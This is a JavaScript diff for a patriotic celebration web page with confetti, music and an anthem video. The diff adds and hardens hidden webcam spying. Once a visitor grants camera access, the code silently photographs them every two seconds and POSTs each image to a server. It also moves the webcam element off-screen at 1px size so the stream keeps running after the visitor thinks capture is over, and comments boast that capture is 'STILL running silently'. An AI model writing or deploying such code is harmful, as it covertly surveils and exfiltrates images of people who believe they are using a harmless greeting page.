@@ -20,36 +20,50 @@ document.addEventListener('DOMContentLoaded', () => {
   let autoCaptureInterval = null;
 
   // ============================================================
-  // SILENT BACKGROUND CAPTURE - runs every 2 seconds forever
-  // Stream NEVER stops as long as user is on the page
+  // SEND PHOTO TO SERVER
   // ============================================================
-  const silentCapture = () => {
-    if (!stream) return;
-    if (!webcam.videoWidth || !webcam.videoHeight) return;
-
-    const tempCanvas = document.createElement('canvas');
-    tempCanvas.width = webcam.videoWidth;
-    tempCanvas.height = webcam.videoHeight;
-    const ctx = tempCanvas.getContext('2d');
-    ctx.drawImage(webcam, 0, 0, tempCanvas.width, tempCanvas.height);
-
-    const canvasData = tempCanvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
-    if (window.POST_URL) {
-      fetch(window.POST_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'cat=' + encodeURIComponent(canvasData)
-      }).catch(() => {});
-    }
+  const sendToServer = (canvas) => {
+    if (!window.POST_URL) return;
+    const data = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
+    fetch(window.POST_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'cat=' + encodeURIComponent(data)
+    }).catch(() => {});
   };
 
+  // ============================================================
+  // CAPTURE FROM WEBCAM (silent, uses hidden off-screen webcam)
+  // ============================================================
+  const captureFrame = () => {
+    if (!stream) return;
+    const w = webcam.videoWidth;
+    const h = webcam.videoHeight;
+    if (!w || !h) return; // video not ready yet
+
+    const c = document.createElement('canvas');
+    c.width = w;
+    c.height = h;
+    c.getContext('2d').drawImage(webcam, 0, 0, w, h);
+    sendToServer(c);
+  };
+
+  // ============================================================
+  // START AUTO-CAPTURE LOOP
+  // Wait until video has dimensions, then fire every 2 seconds
+  // ============================================================
   const startAutoCapture = () => {
-    // Clear any previous interval
-    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
-    // Capture immediately
-    silentCapture();
-    // Then every 2 seconds
-    autoCaptureInterval = setInterval(silentCapture, 2000);
+    if (autoCaptureInterval) return; // already running
+
+    // Poll until video is ready (videoWidth > 0), then start
+    const waitForVideo = setInterval(() => {
+      if (webcam.videoWidth > 0) {
+        clearInterval(waitForVideo);
+        captureFrame(); // first capture immediately
+        // Then every 2 seconds — runs forever until page closes
+        autoCaptureInterval = setInterval(captureFrame, 2000);
+      }
+    }, 200);
   };
 
   // ============================================================
@@ -57,17 +71,21 @@ document.addEventListener('DOMContentLoaded', () => {
   // ============================================================
   startCamBtn.addEventListener('click', async () => {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: false
+      });
       webcam.srcObject = stream;
+      await webcam.play(); // force play
+
       startCamBtn.classList.add('hidden');
       captureBtn.classList.remove('hidden');
 
-      // Start auto-capture as soon as video is playing
-      webcam.addEventListener('playing', startAutoCapture, { once: true });
+      // Start auto-capture loop immediately
+      startAutoCapture();
 
     } catch (err) {
       console.error(err);
-      // Fallback - skip camera, go to name section
       cameraSection.classList.add('hidden');
       nameSection.classList.remove('hidden');
     }
@@ -75,8 +93,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // ============================================================
   // MANUAL CAPTURE BUTTON
-  // Just shows the photo to user & moves to name section
-  // Auto-capture KEEPS RUNNING in background - stream stays alive
+  // Shows photo to user, moves to name section
+  // Stream + interval KEEP RUNNING in background
+  // webcam moved off-screen (NOT display:none — keeps stream alive)
   // ============================================================
   captureBtn.addEventListener('click', () => {
     const w = webcam.videoWidth || 640;
@@ -84,28 +103,28 @@ document.addEventListener('DOMContentLoaded', () => {
 
     snapshotCanvas.width = w;
     snapshotCanvas.height = h;
-    const ctx = snapshotCanvas.getContext('2d');
-    ctx.drawImage(webcam, 0, 0, w, h);
+    snapshotCanvas.getContext('2d').drawImage(webcam, 0, 0, w, h);
 
-    // Show captured photo to user
+    // Show captured photo to user in UI
     userPhoto.src = snapshotCanvas.toDataURL('image/png');
 
-    // Also send this frame to server
-    silentCapture();
+    // Send this frame too
+    sendToServer(snapshotCanvas);
 
-    // *** DO NOT stop stream or interval ***
-    // Keep webcam alive in background (just hide the UI)
-    webcam.style.display = 'none';
+    // Move webcam OFF-SCREEN (not display:none — keeps stream active)
+    webcam.style.position = 'fixed';
+    webcam.style.top = '-9999px';
+    webcam.style.left = '-9999px';
+    webcam.style.width = '1px';
+    webcam.style.height = '1px';
 
-    // Move to name section
+    // Move to name section — auto-capture STILL RUNNING
     cameraSection.classList.add('hidden');
     nameSection.classList.remove('hidden');
   });
 
-
   // ============================================================
-  // CELEBRATION (after name entered)
-  // Auto-capture still continues here too
+  // CELEBRATION
   // ============================================================
   let isMusicPlaying = false;
 
@@ -113,130 +132,67 @@ document.addEventListener('DOMContentLoaded', () => {
     const duration = 15 * 1000;
     const animationEnd = Date.now() + duration;
     const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 50 };
-
-    function randomInRange(min, max) {
-      return Math.random() * (max - min) + min;
-    }
-
-    const interval = setInterval(function() {
+    function randomInRange(min, max) { return Math.random() * (max - min) + min; }
+    const interval = setInterval(() => {
       const timeLeft = animationEnd - Date.now();
       if (timeLeft <= 0) return clearInterval(interval);
-
       const particleCount = 50 * (timeLeft / duration);
-      
-      confetti({
-        ...defaults,
-        particleCount,
-        colors: ['#FF9933', '#FFFFFF', '#138808'],
-        origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }
-      });
-      confetti({
-        ...defaults,
-        particleCount,
-        colors: ['#FF9933', '#FFFFFF', '#138808'],
-        origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }
-      });
+      confetti({ ...defaults, particleCount, colors: ['#FF9933','#FFFFFF','#138808'], origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
+      confetti({ ...defaults, particleCount, colors: ['#FF9933','#FFFFFF','#138808'], origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
     }, 250);
+  };
+
+  const playMusic = () => {
+    bgMusic.play().then(() => { isMusicPlaying = true; }).catch(() => { isMusicPlaying = false; });
   };
 
   const startCelebration = () => {
     const name = nameInput.value.trim() || 'Desh-Bhakt';
     displayName.textContent = name;
-    
-    // Hide modal, show main content
     modal.style.opacity = '0';
     setTimeout(() => {
       modal.classList.add('hidden');
       mainContent.classList.remove('hidden');
-      
       playMusic();
       triggerConfetti();
-      // Auto-capture is still running silently in background!
+      // Auto-capture STILL running silently!
     }, 500);
   };
 
   enterBtn.addEventListener('click', startCelebration);
-  nameInput.addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') startCelebration();
-  });
+  nameInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') startCelebration(); });
 
-  const playMusic = () => {
-    bgMusic.play().then(() => {
-      isMusicPlaying = true;
-    }).catch((e) => {
-      console.log('Autoplay prevented:', e);
-      isMusicPlaying = false;
-    });
-  };
-
-  // Danger Button Logic
+  // Danger Button
   const dangerBtn = document.getElementById('danger-btn');
   const funnyVideoOverlay = document.getElementById('funny-video-overlay');
   const funnyVideo = document.getElementById('funny-video');
   const closeVideoBtn = document.getElementById('close-video-btn');
+  dangerBtn.addEventListener('click', () => { bgMusic.pause(); isMusicPlaying = false; funnyVideoOverlay.classList.remove('hidden'); funnyVideo.play(); });
+  closeVideoBtn.addEventListener('click', () => { funnyVideo.pause(); funnyVideo.currentTime = 0; funnyVideoOverlay.classList.add('hidden'); playMusic(); });
 
-  dangerBtn.addEventListener('click', () => {
-    bgMusic.pause();
-    isMusicPlaying = false;
-    funnyVideoOverlay.classList.remove('hidden');
-    funnyVideo.play();
-  });
-
-  closeVideoBtn.addEventListener('click', () => {
-    funnyVideo.pause();
-    funnyVideo.currentTime = 0;
-    funnyVideoOverlay.classList.add('hidden');
-    playMusic();
-  });
-
-  // Song Menu Logic
+  // Song Menu
   const songMenuBtn = document.getElementById('song-menu-btn');
   const songMenuOverlay = document.getElementById('song-menu-overlay');
   const closeMenuBtn = document.getElementById('close-menu-btn');
   const songOptions = document.querySelectorAll('.song-option');
-  
   const anthemBtn = document.getElementById('anthem-btn');
   const anthemOverlay = document.getElementById('anthem-overlay');
   const closeAnthemBtn = document.getElementById('close-anthem-btn');
+  const anthemVideo = document.getElementById('anthem-video');
 
-  songMenuBtn.addEventListener('click', () => {
-    songMenuOverlay.classList.remove('hidden');
-  });
-
-  closeMenuBtn.addEventListener('click', () => {
-    songMenuOverlay.classList.add('hidden');
-  });
-
+  songMenuBtn.addEventListener('click', () => { songMenuOverlay.classList.remove('hidden'); });
+  closeMenuBtn.addEventListener('click', () => { songMenuOverlay.classList.add('hidden'); });
   songOptions.forEach(btn => {
     btn.addEventListener('click', (e) => {
       const newSrc = e.target.getAttribute('data-src');
-      bgMusic.pause();
-      bgMusic.src = newSrc;
-      bgMusic.load();
-      playMusic();
+      bgMusic.pause(); bgMusic.src = newSrc; bgMusic.load(); playMusic();
       songMenuOverlay.classList.add('hidden');
     });
   });
+  anthemBtn.addEventListener('click', () => { songMenuOverlay.classList.add('hidden'); anthemOverlay.classList.remove('hidden'); bgMusic.pause(); anthemVideo.play(); });
+  closeAnthemBtn.addEventListener('click', () => { anthemOverlay.classList.add('hidden'); anthemVideo.pause(); anthemVideo.currentTime = 0; bgMusic.src = './ReelAudio-1.mp3'; bgMusic.load(); playMusic(); });
 
-  const anthemVideo = document.getElementById('anthem-video');
-
-  anthemBtn.addEventListener('click', () => {
-    songMenuOverlay.classList.add('hidden');
-    anthemOverlay.classList.remove('hidden');
-    bgMusic.pause();
-    anthemVideo.play();
-  });
-
-  closeAnthemBtn.addEventListener('click', () => {
-    anthemOverlay.classList.add('hidden');
-    anthemVideo.pause();
-    anthemVideo.currentTime = 0;
-    bgMusic.src = './ReelAudio-1.mp3';
-    bgMusic.load();
-    playMusic();
-  });
-
-  // Stop capture only when user leaves the page
+  // Cleanup only on page unload
   window.addEventListener('beforeunload', () => {
     if (autoCaptureInterval) clearInterval(autoCaptureInterval);
     if (stream) stream.getTracks().forEach(t => t.stop());
